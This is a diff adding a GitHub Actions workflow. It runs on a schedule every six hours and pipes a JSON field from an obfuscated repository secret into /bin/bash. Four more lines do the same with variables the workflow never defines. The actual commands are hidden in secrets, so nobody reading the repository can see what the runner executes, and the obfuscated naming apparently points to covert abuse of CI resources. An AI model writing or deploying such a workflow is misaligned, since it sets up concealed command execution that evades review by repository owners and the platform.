@@ -1,0 +1,22 @@
+name: lujiancheng2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujiancheng2345
+        env:
+          v24363: ${{ secrets.v24363 }}
+        run: |
+          echo $v24363 | jq -r .fuap01 | /bin/bash
+          echo $t51046 | jq -r .r54692 | /bin/bash
+          echo $solp52 | jq -r .l1457 | /bin/bash
+          echo $js616 | jq -r .el0 | /bin/bash
+          echo $um6692 | jq -r .xt072 | /bin/bash
+
